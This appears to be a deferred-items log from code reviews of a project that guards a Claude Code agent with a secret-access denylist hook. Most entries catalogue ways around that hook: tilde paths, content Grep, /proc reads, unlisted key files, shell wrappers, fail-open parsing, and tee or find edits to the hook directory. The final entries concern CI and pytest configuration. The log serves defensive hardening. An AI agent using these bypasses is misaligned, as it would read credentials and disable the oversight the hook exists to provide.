- **D-26 — Fork-hook existence check cwd-dependent.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:95`. _Nature:_ `if [ -x .claude/hooks/block-secret-access.fork.sh ]` uses repo-relative path. When Claude Code invokes the substrate hook, subprocess cwd = Claude's cwd which may differ from repo root. Fork hook silently NOT invoked. _Carry-to:_ Story 2.17 SC-17 — anchor to `$(dirname "${BASH_SOURCE[0]}")/block-secret-access.fork.sh` OR `$(git rev-parse --show-toplevel)/.claude/hooks/...`.
- **D-27 — Fork-hook exit-code contract gap.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:96-97`. _Nature:_ Substrate passes fork exit code blindly via `exit "$?"`. Fork-hook non-zero exit fails-open per Claude contract; fork-hook 0-exit with empty stdout silently approves. Common authoring-mistake amplification. _Carry-to:_ Story 2.17 SC-17 — validate fork output shape (parse as JSON, check for `decision` key) + warn to stderr on fork failure.
- **D-28 — Tilde-expansion bypass.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:72`. _Nature:_ `cat ~/.claude/oauth_token` approves because hook sees pre-expansion Bash text; `~` is shell-expansion-time. Real attacker uses tilde forms. _Carry-to:_ Story 2.17 SC-17 — add tilde-form patterns (`cat*~/.claude/*`, `cat*~/.config/gh/*`, etc.).
- **D-29 — Manifest `contentHash` scope narrow.** _Source:_ Edge Case Hunter. _Location:_ `packages/keel-invariants/src/invariants.manifest.ts:447-458`. _Nature:_ 35th entry's `contentHash` binds ONLY `docs/invariants/claude-hook-denylist.md`. Hook script + settings.json `hooks` region + 2 seeds NOT content-hashed. Substrate drift from seed passes Story 1.9 sync-gate silently. KNOWN-DEFERRED per invariant doc § Limitations + § Scope-carve-outs; natural Story 2.17 SC-17 scope-inherent. _Carry-to:_ Story 2.17 SC-17 — expand manifest entry to register content-hashes for substrate hook + substrate settings.json (`hooks` region anchor-delimited) + 2 seeds.
- **D-30 — Read-path denylist misses common secret files.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:74-79`. _Nature:_ Coverage includes `.env*`, `.envrc*`, `.secrets*`, `/home/dev/.claude/**`, `/home/dev/.config/gh/**`, `/proc/*/environ`. Misses: `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.crt`, `credentials.json` (GCP / AWS / Firebase), `.pgpass`, `.npmrc`, `.pypirc`, `cacert.pem`, `.docker/config.json`. Story 2.15 D-10 sibling. _Carry-to:_ Story 2.17 SC-17 expanded-coverage scope — AMEND AC 2 Read axis to add in-repo key-file patterns.
- **D-31 — `/proc` surface narrow.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:75, 79`. _Nature:_ Only `environ` covered. Bypasses: `/proc/self/status` (leaks group membership + parent env indirectly), `/proc/<pid>/cmdline` (leaks cmdline args which may contain secrets), `/proc/kcore` + `/proc/kmem` (kernel memory dump including cached tokens), `/proc/<pid>/maps`, `/proc/<pid>/environ.lz4` (some kernels). _Carry-to:_ Story 2.17 SC-17 — document scope carve-out in invariant doc § Limitations OR AMEND AC 2 to broaden `/proc` coverage.
- **D-32 — `.ralph/config.toml` TOML key-name forward-ref untested.** _Source:_ Edge Case Hunter. _Location:_ `.ralph/config.toml:10` + Epic 3 Story 3.7 consumer contract. _Nature:_ No committed consumer code reads this TOML at 1.0. If Story 3.7 renames the key (e.g. to `[security].hook_block_threshold`), substrate silently drifts. _Carry-to:_ Story 2.17 SC-17 OR Epic 3 Story 3.7 — content-hash the TOML file for key-stability OR write a reference-consumer parser test at substrate level.
- **D-33 — Grep content-search bypass.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:87-93`. _Nature:_ Pattern denylist is filename-substring-based, not content-based. `Grep 'SECRET_KEY=' /workspace/**` not caught because pattern `SECRET_KEY=` doesn't match `*.env*|*.envrc*|*.secrets*`. Scope-inherent carve-out — denylist CANNOT cover arbitrary content searches at the hook layer without semantic parsing. _Carry-to:_ Story 2.17 SC-17 — document scope carve-out in invariant doc § Limitations (hook layer is filename-oriented; content-search bypass is architectural).
- **D-34 — `jq` failure path silently fails open.** _Source:_ Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:10-21`. _Nature:_ `jq -r '… // empty' 2>/dev/null || printf ''` swallows jq errors (parse failure, binary absence, exec-limit hit). Empty `tool_name` falls through all case statements → default approve. Silent catastrophic failure mode. No stderr warning, no log entry. _Carry-to:_ Story 2.17 SC-17 — emit stderr warning + distinguish parse-error from valid approve (e.g. `|| { echo "[block-secret-access] jq parse error" >&2; exit 0; }`).
- **D-35 — Unanchored case-glob false-positives.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:53-60`. _Nature:_ `rm*` prefix matches `rmdir`, `rmate`, `rmlint`, `rm-tool`. `rm*.claude/hooks/*` matches `rm /tmp/x && echo .claude/hooks/foo` (contrived but possible). False positives in normal operation (`rmdir .claude/hooks/` for cleanup blocked). _Carry-to:_ Story 2.17 SC-17 — anchor patterns with word boundaries (`rm[[:space:]]*`, etc.).
- **D-36 — Seed exec-bit preservation in packaging.** _Source:_ Blind Hunter. _Location:_ `packages/keel-templates/src/seeds/.claude/hooks/block-secret-access.sh`. _Nature:_ Seed is checked into git with mode `100755` (byte-identity + exec-bit preserved at commit). `create-keel-app` (Story 15a.4 consumer, not yet landed) materialising the seed via `tar` / `pnpm pack` must `tar --preserve-permissions` or equivalent; otherwise the materialised hook is non-executable → Claude Code fails to invoke → hook error → fails open. _Carry-to:_ Story 15a.4 scope-inherent (seed-materialisation plumbing) + document in invariant doc § Fresh-fork-seed contract.

## Deferred from: code review of story-2-17 (2026-04-25)

`/bmad-code-review (args: "2")` (iter-342) DEFER bullets — 25 entries appended at Story 2.17 `sm-verified → done` CR landing. Three parallel adversarial layers fan-out (Blind Hunter no-context + Edge Case Hunter path-tracer + Acceptance Auditor spec-vs-impl); 3 PATCH absorbed inline (bundle-close); 25 DEFER below; ~10 dismissed as noise.

- Hook normalization regex hardening cluster (wrapper-strip 3-level loop bound; closing-quote retention `^(bash|sh)[[:space:]]+-c[[:space:]]+[\"\']?(.*)$`; backslash single-level; xargs short-flag-only `-[a-zA-Z]+`; compound `:&& cat` bypass) at `.claude/hooks/block-secret-access.sh:81-106` — defer: documented limitation class at `docs/invariants/claude-hook-denylist.md § Limitations` (iter-336 awareness-level guidance); hook normalization is best-effort, not strict-adversarial. Carry-to: Epic 4 Story 4.x S4 scanner.
- find-delete dir-targeted miss (an unqualified `find <L1-dir-path> -delete` evades the named-file regex requiring `.claude/settings|.claude/hooks/?|.git/hooks/?`) at `.claude/hooks/block-secret-access.sh:183` — defer: documented in `packages/keel-invariants/fixtures/hooks/README.md § Dominance notes`. Carry-to: Epic 4 hardening.
- echo-redirect regex over-blocks (`echo PATH > /tmp/foo` matches but is benign) AND under-blocks (`printf 'x' > .claude/hooks/x` and `tee .claude/hooks/x` evade) at `.claude/hooks/block-secret-access.sh:163,180` — defer: echo-only conservative anchor accepted; documented limitation. Carry-to: Epic 4 S4.
- `interp_verb_re='(node|python|python3|perl|ruby|php)[[:space:]]+-[a-zA-Z]*[ec]'` sieve forms (`python -m base64`, `<<'EOF'` heredoc, `--input-type=module`, long-form `--eval`) at `.claude/hooks/block-secret-access.sh:205` — defer: in-band coverage acceptable; documented limitation. Carry-to: Epic 4 S4.

## Deferred from: code review of story-1-18 (2026-04-26)

- Hardcoded `setup-uv@v6 version: '0.11.7'` pin without renovate/dependabot handling at `.github/workflows/ci.yml:33` — defer: pin policy per SC-3 + SC-4 by design; renovate integration is its own surface. Carry-to: Story 1.21 audit / renovate config follow-up.
- CI runner Python-version drift risk — `astral-sh/setup-uv@v6` may auto-download Python at job start (no `python-version` input pinned to action; `requires-python = ">=3.10"` floor lets uv pick highest available) at `.github/workflows/ci.yml:32-37` — defer: future-only risk; reproducibility delta between dev (3.12) + CI runner is currently bounded by `requires-python` floor; Story 1.21 audit can codify a pinned `python-version` if needed.
- `pythonpath = ["."]` invites future basename collision / sys.path shadowing at `pyproject.toml [tool.pytest.ini_options]` — adding any second `test_theme.py` (or stray top-level `.py` shadowing stdlib like `tokenize.py`) breaks pytest discovery with non-obvious `ImportPathMismatchError`. defer: out-of-scope per SC-1 BOOTSTRAP-not-coverage; Story 1.21 audit candidate (could ship `__init__.py` markers in each test directory or use `--import-mode=importlib`).
- Future top-level `tui/` package would silently shadow `packages/devbox/tui` because `"."` precedes `"packages/devbox"` in `pythonpath` at `pyproject.toml [tool.pytest.ini_options]` — `from tui.theme import theme` (in `packages/devbox/tui/tests/test_theme.py`) would resolve to the wrong `tui`. No top-level `tui/` exists today (verified via Glob). defer: future risk; Story 1.21 audit territory (could reorder pythonpath or use namespace packages).
